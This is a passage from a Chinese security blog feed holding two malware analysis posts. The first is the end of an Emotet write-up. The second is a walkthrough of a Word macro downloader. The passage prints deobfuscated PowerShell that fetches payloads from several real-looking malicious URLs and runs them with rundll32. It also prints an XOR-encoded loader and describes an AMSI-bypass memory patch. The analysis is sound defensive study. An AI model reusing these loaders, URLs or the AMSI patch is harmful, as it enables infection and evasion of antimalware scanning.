下排版过后如下：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sEt</span> (<span class="string">&quot;Zy35&quot;</span>) ([<span class="type">TyPe</span>](<span class="string">&quot;&#123;2&#125;&#123;5&#125;&#123;4&#125;&#123;0&#125;&#123;1&#125;&#123;3&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;IReC&#x27;</span>,<span class="string">&#x27;To&#x27;</span>,<span class="string">&#x27;SyStEM.&#x27;</span>,<span class="string">&#x27;RY&#x27;</span>,<span class="string">&#x27;O.D&#x27;</span>,<span class="string">&#x27;i&#x27;</span>) );</span><br><span class="line">  <span class="built_in">Set-ITEM</span> variABle:YJu4z3  ([<span class="type">Type</span>](<span class="string">&quot;&#123;4&#125;&#123;5&#125;&#123;3&#125;&#123;6&#125;&#123;1&#125;&#123;7&#125;&#123;0&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;ce&#x27;</span>,<span class="string">&#x27;eT.SeRV&#x27;</span>,<span class="string">&#x27;pOinTMANAgEr&#x27;</span>,<span class="string">&#x27;Stem.&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;i&#x27;</span>)  );</span><br><span class="line">  <span class="variable">$ErrorActionPreference</span> = ((<span class="string">&#x27;SilentlyContinue&#x27;</span>));</span><br><span class="line">  <span class="variable">$U1uh748</span>=<span class="variable">$E34H</span> + [<span class="built_in">char</span>](<span class="number">64</span>) + <span class="variable">$G35Q</span>;<span class="variable">$B62Q</span>=((<span class="string">&#x27;L03K&#x27;</span>);</span><br><span class="line">   (  <span class="built_in">dir</span>  (<span class="string">&#x27;VArIABLe:zy35&#x27;</span>)).vaLUE::<span class="string">&quot;CReATedIrEcToRy&quot;</span>(<span class="variable">$HOME</span> + (((<span class="string">&#x27;XE8Z3tnc5dXE8L6z3oo3XE8&#x27;</span>)<span class="operator">-RePLACe</span> ([<span class="built_in">CHAr</span>]<span class="number">88</span>+[<span class="built_in">CHAr</span>]<span class="number">69</span>+[<span class="built_in">CHAr</span>]<span class="number">56</span>),[<span class="built_in">CHAr</span>]<span class="number">92</span>));</span><br><span class="line">  <span class="variable">$M95A</span>=(<span class="string">&#x27;F70N&#x27;</span>);  (<span class="built_in">Ls</span>  VAriABle:YJU4Z3).vaLuE::<span class="string">&quot;seCuriTYpRotOCoL&quot;</span> = ((<span class="string">&#x27;Tls12&#x27;</span>);</span><br><span class="line">  <span class="variable">$L5_C</span>=(<span class="string">&#x27;P67K&#x27;</span>);</span><br><span class="line">  <span class="variable">$Vlzczi0</span> = (<span class="string">&#x27;O28C&#x27;</span>);</span><br><span class="line">  <span class="variable">$P40O</span>=(<span class="string">&#x27;W31C&#x27;</span>));</span><br><span class="line">  <span class="variable">$F4mnqaf</span>=<span class="variable">$HOME</span>+((<span class="string">&#x27;&#123;0&#125;Z3tnc5d&#123;0&#125;L6z3oo3&#123;0&#125;&#x27;</span>)  <span class="operator">-f</span>[<span class="built_in">cHar</span>]<span class="number">92</span>)+<span class="variable">$Vlzczi0</span>+(<span class="string">&#x27;.dll&#x27;</span>));</span><br><span class="line">  <span class="variable">$J04B</span>=(<span class="string">&#x27;Q40L&#x27;</span>));</span><br><span class="line">  <span class="variable">$Ml3evql</span>=(<span class="string">&#x27;http://insvat.com/wp-admin/Dw/</span></span><br><span class="line"><span class="string">  @http://littleindiadirectory.com/l/TOYuT/</span></span><br><span class="line"><span class="string">  @http://blogs.g2gtechnologies.com/blogs/v/</span></span><br><span class="line"><span class="string">  @http://pattayastore.com/visio-network-1hmpp/j5/</span></span><br><span class="line"><span class="string">  @http://rsimadinah.com/wp-content/16qT/</span></span><br><span class="line"><span class="string">  @https://tenmoney.business/wp-content/nhW/</span></span><br><span class="line"><span class="string">  @https://sureoptimize.com/well-known/QsEs/&#x27;</span>)).<span class="string">&quot;RePLacE&quot;</span>((<span class="string">&#x27;http&#x27;</span>),([<span class="built_in">array</span>](<span class="string">&#x27;sd&#x27;</span>,<span class="string">&#x27;sw&#x27;</span>),(<span class="string">&#x27;http&#x27;</span>),<span class="string">&#x27;3d&#x27;</span>)[<span class="number">1</span>]).<span class="string">&quot;SpLit&quot;</span>(<span class="variable">$R71P</span> + <span class="variable">$U1uh748</span> + <span class="variable">$X49R</span>);</span><br><span class="line">  <span class="variable">$I14G</span>=(<span class="string">&#x27;W94G&#x27;</span>));</span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$Qx55iz5</span> <span class="keyword">in</span> <span class="variable">$Ml3evql</span>)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">try</span>&#123;</span><br><span class="line">          (.(<span class="string">&#x27;New-Object&#x27;</span>) syStEm.neT.WEBcliEnt).<span class="string">&quot;dOwnLoADfIlE&quot;</span>(<span class="variable">$Qx55iz5</span>, <span class="variable">$F4mnqaf</span>);</span><br><span class="line">          <span class="variable">$G50C</span>=(<span class="string">&#x27;U37W&#x27;</span>));</span><br><span class="line">          <span class="keyword">if</span> ((&amp;(<span class="string">&#x27;Get-Item&#x27;</span>) <span class="variable">$F4mnqaf</span>).<span class="string">&quot;LENGth&quot;</span> <span class="operator">-ge</span> <span class="number">31963</span>) </span><br><span class="line">          &#123;</span><br><span class="line">              &amp;(<span class="string">&#x27;rundll32&#x27;</span>) <span class="variable">$F4mnqaf</span>,((<span class="string">&#x27;Control_RunDLL&#x27;</span>).<span class="string">&quot;tOsTrING&quot;</span>();</span><br><span class="line">              <span class="variable">$H37C</span>=(<span class="string">&#x27;H30J&#x27;</span>));</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">              <span class="variable">$K4_Q</span>=(<span class="string">&#x27;M16Q&#x27;</span>)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">catch</span>&#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$B72H</span>=(<span class="string">&#x27;S__X&#x27;</span>))</span><br></pre></td></tr></table></figure><p>从上面的PowerShell脚本可以看出，该样本从5个恶意网址上下载恶意dll，利用rundll32.exe来执行恶意动态链接库的<code>control_rundll</code>导出函数。</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Emotet背景&quot;&gt;&lt;a href=&quot;#Emotet背景&quot; class=&quot;headerlink&quot; title=&quot;Emotet背景&quot;&gt;&lt;/a&gt;Emotet背景&lt;/h1&gt;&lt;p&gt;Emotet是一款过去几年中活动最频繁的恶意软件之一。2014年Emotet首先以银行木马的</summary>
      
    
    
    
    <category term="Reverse" scheme="http://0xnope.top/categories/Reverse/"/>
    
    
    <category term="Windows" scheme="http://0xnope.top/tags/Windows/"/>
    
    <category term="Malware_analysis" scheme="http://0xnope.top/tags/Malware-analysis/"/>
    
  </entry>
  
  <entry>
    <title>记一次Word宏Downloader样本分析</title>
    <link href="http://0xnope.top/2021/04/28/%E8%AE%B0%E4%B8%80%E6%AC%A1Word%E5%AE%8FDownloader%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>http://0xnope.top/2021/04/28/%E8%AE%B0%E4%B8%80%E6%AC%A1Word%E5%AE%8FDownloader%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</id>
    <published>2021-04-28T08:59:55.000Z</published>
    <updated>2021-04-29T10:25:28.921Z</updated>
    
    <content type="html"><![CDATA[<p>第一次分析Office类宏VBA病毒，做个记录。</p><h1 id="样本概况"><a href="#样本概况" class="headerlink" title="样本概况"></a>样本概况</h1><h2 id="测试环境及工具"><a href="#测试环境及工具" class="headerlink" title="测试环境及工具"></a>测试环境及工具</h2><blockquote><p>运行平台：Windows 7 x64                                                                                                                                                                                                   进程监控工具：ProcessHacker                                                                                                                                                                                                      调试分析工具：powershell_ise、Visual Studio2019</p></blockquote><h2 id="样本基本信息"><a href="#样本基本信息" class="headerlink" title="样本基本信息"></a>样本基本信息</h2><blockquote><p>文件名称:  a474c4ea67fd30e80ca375370d19dd0712997889814c2960d8a41c2856092ce5.doc<br>样本类型:  Microsoft Word 2007+<br>样本大小:  28.44KB (29123 bytes)<br>MD5:  9eafc9090d71b382af7c8c04e83d61d2<br>SHA1:  32a192bab959b725cc02cf3df9b063e160b9ac43<br>SHA256:  a474c4ea67fd30e80ca375370d19dd0712997889814c2960d8a41c2856092ce5</p></blockquote><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210428172816.png" alt="Word宏病毒001（virustotal概况）"></p><p>在virustotal上查询该样本，被标记为Downloader，而且还有一些厂商还未捕获该样本。</p><h2 id="沙箱检测："><a href="#沙箱检测：" class="headerlink" title="沙箱检测："></a>沙箱检测：</h2><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210428174637.png" alt="Word宏病毒002（沙箱检测）"></p><p>沙箱检测出病毒创建了3个进程，其中有一个是powershell.exe、释放了4个文件。</p><p>下面分析一下这个样本。</p><h1 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h1><h2 id="VBA宏分析"><a href="#VBA宏分析" class="headerlink" title="VBA宏分析"></a>VBA宏分析</h2><p>word 2010双击点开样本，提示需要启用宏功能，这是典型的Office类宏病毒手法，使用VBA宏脚本来隐藏实际功能，如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210428175605.png" alt="Word宏病毒003（启用宏）"></p><p>这里按下<strong>alt+f11</strong>打开宏调试器。</p><p>但是代码被混淆了，我们将所有内容复制出来，在网址<a href="https://www.automateexcel.com/vba-code-indenter/">https://www.automateexcel.com/vba-code-indenter/</a> 将其复原（虽然效果一般，依然有些排版混乱）如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210428180133.png" alt="Word宏病毒004（格式化代码）"></p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><h3 id="分析VBA代码"><a href="#分析VBA代码" class="headerlink" title="分析VBA代码"></a>分析VBA代码</h3><p>由于排版混乱，各种goto语句乱跳，静态分析让人头疼，我们将代码复制到宏调试器，直接动态调试。</p><p>f8单步我们可以发现函数<code>Docuement_Open</code>为入口函数，这里在入口设置断点（直接点击侧边的位置即可）。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210428182234.png" alt="Word宏病毒005（VBA动态调试）"></p><p><code>Dim Garniture As Object</code> 是声明Garniture变量为Object 数据类型。Object 数据类型Garniture变量存储为 32 位（4个字节）的地址形式，其为对象的引用。利用 Set 语句，声明为 Object的变量可以赋值为任何对象的引用。</p><p>使用 <code>GetObject</code> 函数返回文件中的 ActiveX 对象的引用，而且可以将该对象赋给对象变量。可以使用 Set 语句将 <code>GetObject</code> 返回的对象赋给对象变量。如：</p><figure class="highlight vb"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Dim</span> test <span class="keyword">As</span> <span class="type">Object</span></span><br><span class="line"><span class="keyword">Set</span> test = GetObject(<span class="string">&quot;C:\test.exe&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="Lethbridge函数"><a href="#Lethbridge函数" class="headerlink" title="Lethbridge函数"></a>Lethbridge函数</h4><p>接着继续f8进入到<code>Lethbridge</code>函数，这里传入的参数为<code>de9a2c49a42b6</code></p><blockquote><p>视图—&gt;本地窗口可以打开变量窗口，可以直接观察到每个变量的值。</p></blockquote><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210428183357.png" alt="Word宏病毒006"></p><p><code>StrConv</code>是对字符串进行操作，第2个参数很关键，而且必填，其值的和决定转换的类型。</p><p>128表示的操作是Garniture变量存的字符串从 Unicode 转换为系统的默认代码页；</p><p>64表示将字符串转换为Unicode使用系统的默认代码页。</p><p>这里的参数是128，表示将Garniture变量存的字符串从 Unicode 转换为系统的默认代码页（我的理解是类似C++的String转char），然后存放在<code>Humoursome</code>数组。便于后续的解密操作。</p><p>调试过后可以知道，<code>Lethbridge</code>函数的作用是将<code>Humoursome</code>数组内容取出来一个一个进行解密，解密过后的结果为：</p><p>Lethbridge : “winmgmts:\.\root\cimv2:Win32_Process” : String</p><blockquote><p>Win32_Process 类别代表在 Win32 系统上的一系列事件。 </p><p>“winmgmts:\.\root\CIMV2”用法的说明是创建对象，获取进程相关信息。</p><p>总之通过”winmgmts:\.\root\cimv2:Win32_Process”这个对象来创建进程，获取进程信息。</p></blockquote><p>继续往下，获取<code>Win32_Process</code>字符串之后调用<code>GetObject</code>函数获取指定的对象并将获取的对象传入到调用函数<code>SnottineSS</code>内，该函数也会解密出一个字符串内容并通过<br><code>Win32_Process.Create</code>函数会创建一个进程，如下</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210428210526.png" alt="Word宏病毒007（创建进程）"></p><p>紧接着下面又解密了一个字符串：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210428211614.png" alt="Word宏病毒008（解密ps）"></p><p>可以看出这是一个3692Byte的powershell脚本。内容如下：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">y171e</span></span> &#123;</span><br><span class="line"><span class="keyword">param</span>(<span class="variable">$z4627</span>)<span class="variable">$k58be9</span>=<span class="string">&#x27;a57157c&#x27;</span>;</span><br><span class="line"><span class="variable">$yce74a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$z4627</span>.length;<span class="variable">$i</span>+=<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$vc2775</span>=[<span class="type">convert</span>]::ToByte(<span class="variable">$z4627</span>.Substring(<span class="variable">$i</span>,<span class="number">2</span>),<span class="number">16</span>);</span><br><span class="line"><span class="variable">$yce74a</span>+=[<span class="built_in">char</span>](<span class="variable">$vc2775</span> <span class="operator">-bxor</span> <span class="variable">$k58be9</span>[(<span class="variable">$i</span>/<span class="number">2</span>)%<span class="variable">$k58be9</span><span class="type">.length</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>很显然这上面的内容肯定没有3692Byte，说明该powershell脚本并不完整。或者说，参数被隐藏了。</p><p>由<code>powershell -WindowStyle Hidden </code>可以知道，该脚本程序会在启动时将<code>PowerShell</code>窗口隐藏然后才执行之后的操作。</p><p><strong>我们需要得到完整的Power Shell脚本。</strong></p><p>启动Process Hacker.exe监控进程，重新调试，在上面创建进程这个地方，powershell.exe一闪而过。可以确定此处打开了powershell.exe。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210428231536.png" alt="Word宏病毒009"></p><p>我们在此处下断点，再一次重新调试，运行到此处不f8，而是shift+f8，在Process Hacker.exe中抓住powershell.exe一闪而逝的机会点击，powershell.exe打开属性，在General–&gt;Command line中可以看到完整的powershell脚本，如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210428231548.png" alt="Word宏病毒010（解密ps2）"></p><p>将其复制出来，整理一下，得到完整的powershell脚本：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">y171e</span> </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">param</span>(<span class="variable">$z4627</span>)<span class="variable">$k58be9</span>=<span class="string">&#x27;a57157c&#x27;</span>;</span><br><span class="line"><span class="variable">$yce74a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$z4627</span>.length;<span class="variable">$i</span>+=<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$vc2775</span>=[<span class="type">convert</span>]::ToByte(<span class="variable">$z4627</span>.Substring(<span class="variable">$i</span>,<span class="number">2</span>),<span class="number">16</span>);</span><br><span class="line"><span class="variable">$yce74a</span>+=[<span class="built_in">char</span>](<span class="variable">$vc2775</span> <span class="operator">-bxor</span> <span class="variable">$k58be9</span>[(<span class="variable">$i</span>/<span class="number">2</span>)%<span class="variable">$k58be9</span><span class="type">.length</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$yce74a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$z24c573</span> = <span class="string">&#x27;14465e5f52173018464354580c16125c595615641a1241525c1b65160f415e5c50192a0f4152435a4730044741585652105a4044585b5043324c4445505a4d255c56565b5810155c54420e4210085b5011664e1015505a1f7c785814465e5f5217301846435458192d04410c3c3f471603595e5215540f004644114c5502530c0f024e6c270d597e5c455811151d155a50450d04590403171b260f41454865580a0f410a137252173147585274530713504442171e3e1140555d5c5443124156455c5443044d4354475943285b436141454317020008571f2a0f41674547171b59510404031b1015475e5f52171556575206061e583a715b5d7c5a130e474319175c06135b525d0605414d705945474e330e5c594508152f0e54537d5c551100474e131c6a1314575b5856171015544358561706194152435b172a0f41674547170657030207510e4b124145585b50431b560154541e583a715b5d7c5a130e474319175c06135b525d0605414d705945474e330e5c594508153508474344545b33135a435456434148684744575b0a0215444554430a021552494152110f15555e5a5b43090254040d014b285b43614145430c5156060d01574d607e5f41671713155c0302550050571b445c5917414d545554515158195844411716085b4311470f5703060e180e6c270d597e5c455811151d157a50450d045904031b530f0d171b745b4311186558585b435e4367435d7858150478525c5a451a43196454417b02124172434758115c53565d46524a3c464350415e0041504f4550450d41435858511706070056541d7e0d1565434315565a550d5209197e0d15654343155b5b03040554195e0d15155005560106480e4744575b0a0215444554430a02155e5f411700500c04531d1e18285b4361414543020756540753555c500107000107581d4e0002060649170701000f5755000f0057025051530755171e4a5a5c511956050204075307140a2a0f416745471939044758184e7e0d1565434315455a57060308060a1556020e531d545100500555031b1a500206541d155151000f0501025b570302050505530702000507025454060203040641481c0c58531f11580304050c04425c7c59456543114f6f52435a1e18347c5945654311415d55505405075c1d62785b433315471e040e420a0f41175a0c5450560c0a010e5e05495d0052000f5549470e0706035a52195f535456510519074901074f0e4043115e0e0052020e181c4c211841526a68170904045255084c531906061d054f05071907490c071e5a7c5945654311415b55020700025c785643465f020d1b765d59580029725b5e57560f49061e0a785611125d565d1b740c114c1f5b5006060519071d5b55505302561d061e5804530250501f0d044217785b433315471f430c0150550c041f61582a0f4101051d1e48514d070104554a4d5b55020700024d061e0a484a1e124145585b504312040f0253565e245b415847580d0c5059451b70061573585d515211315443591d720d175c455e5b5a060f41196245520008545b775a5b070447197045470f085656455c580d255443501c174841176b6d560e51540015111e171a500206541d155707000705530257431c0c5f50404336505572595e060f411f181b730c165b5b5e545325085952194c065450501f13050e5750010405040355515103520152565700010453020154030700050f57570100050602025502070704045750015204060354540d070905035756010300530255540d075401525754000f0504060251530552040155530254050600505703020205015555000f0654035251500355050357050005131c1b10500d0457541e583147585250441032415643417e0d075a174803540153085954421733135a5454464430155445457c59050e1d44000d0405001c0c614758000446441f66430213411f48035401531c0c43504316135b17010e4a1314575b585617101554435856171015475e5f52171a500206541d4417135c5956155a06590c0e051c4c1015475e5f52171b59510404030a4100000000000000430e4445475e0d06155207030255050c0a13170c050e471f585b43430808070a155e5f0c500f080c034d2d505956415f58081e0a031c4c011841521143005458570a725a59150447431f6158211841521958525b580c031f664201124145585b504b08190518190655480e5207030255050c1c0c1d540b00471e19430054585769490d535054036c195c185148104f09510456571b7b545b501709681e0a4845061540455f155255570001550c0c1e1c&#x27;</span>;</span><br><span class="line"><span class="variable">$z24c5732</span> = y171e(<span class="variable">$z24c573</span>);</span><br><span class="line"><span class="built_in">Add-Type</span> <span class="literal">-TypeDefinition</span> <span class="variable">$z24c5732</span>;</span><br><span class="line">[<span class="type">yba2983</span>]::c193b();</span><br></pre></td></tr></table></figure><h3 id="分析powershell脚本"><a href="#分析powershell脚本" class="headerlink" title="分析powershell脚本"></a>分析powershell脚本</h3><p>上面的代码可以看到：</p><p>首先，程序将值<code>$z24c573</code>传入函数<code>y171e</code>，这里的<code>y171e</code>应该是一个解密函数。解密过后的内容存于<code>$z24c5732</code>；</p><p>然后，调用<code>Add-Type -TypeDefinition</code>将该类添加到会话中，由于由于它使用的是内联源代码，所以该命令使用 <code>TypeDefinition</code> 参数来指定  <code>$z24c5732</code> 变量中的代码。（MSDN中我们可以知道，使用Add-Type 可以在Windows PowerShell会话定义添加 Microsoft .NET Framework 类型（一种类）。这就表明<code>$z24c5732</code>存储的解密后的内容其实是一个<code>.Net</code>的程序源码。<a href="https://docs.microsoft.com/zh-CN/previous-versions//dd315241(v=technet.10)?redirectedfrom=MSDN">Add-Type | Microsoft Docs</a>）。</p><p>最后，<code>[yba2983]::c193b();</code>调用类的静态方法</p><blockquote><p><strong>调用类的静态方法</strong>：用中括号把类的名称括起来，然后输入两个冒号，然后再输入方法名，最后是方法的参数。</p><p><strong>访问类的静态属性</strong>：用中括号把类的名称括起来，然后输入两个冒号，然后再输入属性名。来访问.NET类的静态属性。</p><p><strong>调用对象的方法</strong>：在对象变量之后使用点（.）作为成员变量符，然后加上方法名，和方法参数即可。</p><p><a href="https://www.jb51.net/article/53191.htm">PowerShell中调用.NET对象的静态方法、静态属性和类方法、类属性例子</a>。</p></blockquote><p><strong>我们需要知道经过y171e函数解密过后存放在变量$z24c5732中的内容是什么。</strong></p><p>powershell或者cmd窗口中输入<code>powershell_ise.exe</code>启动<strong>powerShell ISE</strong>工具进行调试，将原powershell脚本的第一行和最后两行删去，直接输出变量<code>$24c5732</code>的内容如下:</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210429125640.png" alt="Word宏病毒011（1.ps）"></p><p>保存为1.ps1，运行脚本得到解密内容（需要以管理员身份打开powershell.exe然后set-executionpolicy remotesigned修改执行策略为remotesigned）</p><p>如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210429125916.png" alt="Word宏病毒012（输出解密内容）"></p><h3 id="分析-NET代码"><a href="#分析-NET代码" class="headerlink" title="分析.NET代码"></a>分析.NET代码</h3><p>我们在Visual Studio2019，创建一个C#控制台应用程序，将解密出来的.Net代码提出来进行分析：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210429134039.png" alt="Word宏病毒013（分析.NET代码）"></p><p>可以看到，程序导入了kernel.dll的4个API函数：</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">[<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>, EntryPoint = <span class="meta-string">&quot;GetProcAddress&quot;</span>)</span>] <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">v779b</span>(<span class="params">IntPtr x8d356, <span class="built_in">string</span> v7be73</span>)</span>;</span><br><span class="line">    [<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>, EntryPoint = <span class="meta-string">&quot;LoadLibrary&quot;</span>)</span>] <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">e6656d9</span>(<span class="params"><span class="built_in">string</span> zc6ea</span>)</span>;</span><br><span class="line">    [<span class="meta">DllImport(<span class="meta-string">&quot;kernel32&quot;</span>, EntryPoint = <span class="meta-string">&quot;VirtualProtect&quot;</span>)</span>] <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> <span class="title">h7c586</span>(<span class="params">IntPtr mda7864, UIntPtr k27bc1b, uint xcdaf29, <span class="keyword">out</span> uint r84b39</span>)</span>;</span><br><span class="line">    [<span class="meta">DllImport(<span class="meta-string">&quot;Kernel32.dll&quot;</span>, EntryPoint = <span class="meta-string">&quot;RtlMoveMemory&quot;</span>, SetLastError = false)</span>] <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">ef5ae</span>(<span class="params">IntPtr a948e8, IntPtr l8b12e, <span class="built_in">int</span> g4c6e</span>)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>函数y171e()就是解密函数，将传入的字符串和字符串”a57157c”中的一些值进行异或操作，然后返回解密出的字符串。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210429134351.png" alt="Word宏病毒014（解密函数y171e）"></p><p>函数c193b()就是Run函数，如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210429143001.png" alt="Word宏病毒015（Run函数c193b） "></p><p>可以看到，其中多次调用y171e()函数共解密了四个字符串。</p><blockquote><p>amsi.dll</p><p>AmsiScanBuffer</p><p>C:\Users\thh\AppData\Roaming\c9255.exe</p><p><a href="https://cannabispropertybrokers.com/pop/8OwWKrFQ0gQoKt9.exe">https://cannabispropertybrokers.com/pop/8OwWKrFQ0gQoKt9.exe</a></p></blockquote><p>函数先解密了前两个字符串，<code>LoadLibrary</code>导入amsi.dll然后<code>GetProcAdderss</code>获取<code>AmsiScanBuffer</code>地址。然后判断获取的函数指针是否为空，如果不为空，执行下面的if语句。然后调用<code>VirtualProtect</code>函数修改对应的内存属性从仅可读修改为可读可写（PAGE_EXECUTE_READWRITE = 0x40），之后调用<code>Marshal</code>函数分配内存并将<code>Byte[] jeled = &#123;0x31, 0xff, 0x90&#125;</code>复制到AmsiScanbufferAddr + 0x001b的内存区域</p><p>amsi是什么？这些操作是要干嘛？<code>AmsiScanBuffer</code>的作用是什么？0x31, 0xff, 0x90复制到AmsiScanbufferAddr + 0x001b的内存区域是要干嘛？</p><p>Google搜索到对AMSI的解释如下：</p><blockquote><p>AMSI（Antimalware Scan Interface，反恶意软件扫描接口）。反恶意软件解决方案支持 AMSI，那么在 Windows 10 上就可以阻止 PowerShell 攻击代码的执行。 反恶意软件扫描接口 (AMSI) 是一种允许应用程序和服务集成在一台机器上的任何反恶意软件产品的泛型接口标准。</p></blockquote><p>Google搜索Byte[] jeled = {0x31, 0xff, 0x90}找到绕过AMSI的文章如下：</p><blockquote><p><a href="https://www.cyberark.com/resources/threat-research-blog/amsi-bypass-redux">AMSI Bypass Redux</a></p></blockquote><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210429150931.png" alt="Word宏病毒016（bypassAMSI） "></p><p>可以得知，if判断当中的内容其实就是绕过AMSI的代码。</p><p>现在我们知道这个.NET代码的作用了，总结一下：</p><p>首先导入四个API，</p><p>然后解密两个字符串，获取<code>AmsiScanBuffer</code>地址，<code>AmsiScanBuffer</code>的作用就是给amsi.dll打补丁以此绕过AMSI，防止被扫描到；</p><p>紧接着就是语句<code>MoveMemory(AmsiScanbufferAddr + 0x001b, unmanagedPointer, 3);</code>给amsi.dll打补丁（0x31, 0xff, 0x90）绕过AMSI（使用xor edi，edi操作码对相关行（将rd8提交到edi寄存器的行）打补丁）。</p><p>最后解密两个字符串，一个网址，一个本地文件路径，调用<code>WebClient</code>函数将网址上的文件下载到指定路径并启动运行。</p><p>但是很遗憾，这个网站已经炸了，下载不了这个文件了。这个网站可能是随关随停的，当时用了就关了，也有可能是被举报下挂了。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210429151425.png" alt="Word宏病毒017"></p><p>由于该样本动态给amsi.dll打了补丁以此绕过了AMSI的检测，使得一部分厂商没有查杀到该病毒。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>由于是第一次分析Office宏病毒样本，很多地方我都阐述得或许不是很恰当，对VBA程序的分析、powershell脚本的调试都稍显得有些生疏，但是在在分析该样本的过程中我也逐渐熟悉一些宏病毒的一些常规分析手法：VBA程序、powershell脚本、.NET程序。学习C#、powershell脚本、VBA的一些语法和API的用法，熟悉了AMSI（Antimalware Scan Interface，反恶意软件扫描接口）机制，也顺带学习了如何绕过AMSI。</p><p><strong>参考</strong></p><p><a href="https://docs.microsoft.com/zh-CN/previous-versions//dd315241(v=technet.10)?redirectedfrom=MSDN">Add-Type | Microsoft Docs</a></p><p><a href="https://www.jb51.net/article/53191.htm">PowerShell中调用.NET对象的静态方法、静态属性和类方法、类属性例子</a></p><p><a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">Antimalware Scan Interface (AMSI)</a></p><p><a href="https://www.cyberark.com/resources/threat-research-blog/amsi-bypass-redux">AMSI Bypass Redux</a></p><p><a href="https://www.ringzerolabs.com/2020/10/obfuscated-vba-powershell-c.html">Obfuscated VBA, Powershell, C#</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;第一次分析Office类宏VBA病毒，做个记录。&lt;/p&gt;
&lt;h1 id=&quot;样本概况&quot;&gt;&lt;a href=&quot;#样本概况&quot; class=&quot;headerlink&quot; title=&quot;样本概况&quot;&gt;&lt;/a&gt;样本概况&lt;/h1&gt;&lt;h2 id=&quot;测试环境及工具&quot;&gt;&lt;a href=&quot;#测试环境及工</summary>
      
    
    
    
    <category term="Reverse" scheme="http://0xnope.top/categories/Reverse/"/>
    
    
    <category term="Windows" scheme="http://0xnope.top/tags/Windows/"/>
    
    <category term="Malware_analysis" scheme="http://0xnope.top/tags/Malware-analysis/"/>
    
  </entry>
